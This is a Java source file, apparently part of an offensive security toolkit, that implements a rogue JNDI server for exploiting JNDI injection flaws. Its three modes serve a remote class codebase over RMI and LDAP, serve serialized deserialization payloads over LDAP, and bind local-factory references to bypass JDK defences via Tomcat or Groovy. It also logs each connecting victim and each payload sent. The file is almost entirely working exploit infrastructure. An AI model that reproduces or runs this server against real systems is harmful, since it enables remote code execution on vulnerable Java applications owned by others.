package com.xyuxu.javasec.core.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.UnicastRemoteObject;
import java.util.function.Consumer;

public class JNDIServer {

    private Registry rmiRegistry;
    private Remote rmiBoundObject;

    private InMemoryDirectoryServer ldapServer;
    private final Consumer<String> logger;

    public JNDIServer(Consumer<String> logger) {
        this.logger = logger;
    }

    // 模式 1: 标准远程加载 (JDK < 8u191)
    public void startRemoteFactory(String ip, int rmiPort, int ldapPort, String codebase, String className) {
        try {
            // RMI
            initRMIRegistry(ip,rmiPort);
            Reference ref = new Reference(className, className, codebase);
            ReferenceWrapper wrapper = new ReferenceWrapper(ref);
            this.rmiBoundObject = wrapper;

            rmiRegistry.bind("Object", wrapper);
            logger.accept("[RMI] [Remote] Listening on port " + rmiPort);

            // LDAP
            startLdapServer(ldapPort, (entry) -> {
                entry.addAttribute("javaClassName", "foo");
                entry.addAttribute("javaCodeBase", codebase);
                entry.addAttribute("objectClass", "javaNamingReference");
                entry.addAttribute("javaFactory", className);
            });
            logger.accept("[LDAP] [Remote] Listening on port " + ldapPort);
        } catch (Exception e) {
            e.printStackTrace();
            logger.accept("[Error] Remote Mode Startup Failed: " + e.getMessage());
        }
    }

    // 模式 2: LDAP 序列化数据
    public void startSerializedData(int ldapPort, byte[] serializedPayload) {
        try {
            logger.accept("[RMI] Skipped (Serialized Data mode supports LDAP only)");

            startLdapServer(ldapPort, (entry) -> {
                entry.addAttribute("javaClassName", "foo");
                entry.addAttribute("javaSerializedData", serializedPayload);
            });
            logger.accept("[LDAP] [Serialized] Listening on port " + ldapPort);
        } catch (Exception e) {
            e.printStackTrace();
            logger.accept("[Error] Serialized Mode Startup Failed: " + e.getMessage());
        }
    }

    // 模式 3: 本地工厂绕过 (Tomcat/Groovy)
    public void startLocalFactory(String ip,int rmiPort, Reference reference) {
        try {
            // RMI
            initRMIRegistry(ip,rmiPort);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);

            // 保存引用以便关闭
            this.rmiBoundObject = wrapper;

            rmiRegistry.bind("Object", wrapper);

            logger.accept("[RMI] [LocalBypass] Listening on port " + rmiPort);
            logger.accept("[RMI] Payload Type: " + reference.getClassName());

            logger.accept("[LDAP] Skipped for Local Factory Bypass");
        } catch (Exception e) {
            e.printStackTrace();
            logger.accept("[Error] Local Factory Mode Startup Failed: " + e.getMessage());
        }
    }

    private void initRMIRegistry(String ip,int port) throws RemoteException {
        System.setProperty("sun.rmi.registry.registryFilter", "*");
        if (ip != null && !ip.trim().isEmpty()) {
            System.setProperty("java.rmi.server.hostname", ip);
        }

        try {
            rmiRegistry = LocateRegistry.createRegistry(port, null, new RMIServerSocketFactory() {
                @Override
                public ServerSocket createServerSocket(int p) throws IOException {
                    InetAddress bindAddress = (ip != null && !ip.trim().isEmpty())
                            ? InetAddress.getByName(ip)
                            : InetAddress.getByName("0.0.0.0");
                    return new ServerSocket(p) {
                        @Override
                        public Socket accept() throws IOException {
                            // 1. 调用父类 accept 阻塞等待连接
                            Socket s = super.accept();
                            // 2. 捕获连接并记录 IP
                            String ip = s.getInetAddress().getHostAddress();
                            // 使用 logger 回调记录
                            if (logger != null) {
                                logger.accept("[RMI] >> New Connection from: " + ip);
                            }
                            // 3. 返回 Socket 给 RMI 运行时
                            return s;
                        }
                    };
                }
            });
        } catch (Exception e) {
            if (e.getMessage().contains("ObjID already in use") || e.getMessage().contains("Port already in use")) {
                logger.accept("[Warning] RMI Port " + port + " is busy. Reusing existing registry (Logs unavailable for reused port).");
                rmiRegistry = LocateRegistry.getRegistry(port);
            } else {
                throw new RemoteException("RMI Registry creation failed", e);
            }
        }
    }

    private void startLdapServer(int port, Consumer<Entry> entryModifier) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", InetAddress.getByName("0.0.0.0"), port,
                ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                try {
                    String base = result.getRequest().getBaseDN();
                    Entry entry = new Entry(base);
                    entryModifier.accept(entry);
                    result.sendSearchEntry(entry);
                    result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                    logger.accept("[LDAP] >> Payload sent to " + result.getConnectedAddress());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        ldapServer = new InMemoryDirectoryServer(config);
        ldapServer.startListening();
    }

    /**
     * 停止服务
     */
    public void stop() {
        // 1. 关闭 LDAP
        try {
            if (ldapServer != null) {
                ldapServer.shutDown(true);
                ldapServer = null;
            }
        } catch (Exception e) { e.printStackTrace(); }
        // 2. 关闭RMI绑定的业务对象
        try {
            if (rmiBoundObject != null) {
                UnicastRemoteObject.unexportObject(rmiBoundObject, true);
                rmiBoundObject = null;
            }
        } catch (Exception e) {
        }
        // 3. 关闭 Registry
        try {
            if (rmiRegistry != null) {
                UnicastRemoteObject.unexportObject(rmiRegistry, true);
                rmiRegistry = null;
            }
        } catch (Exception e) { e.printStackTrace(); }
    }
}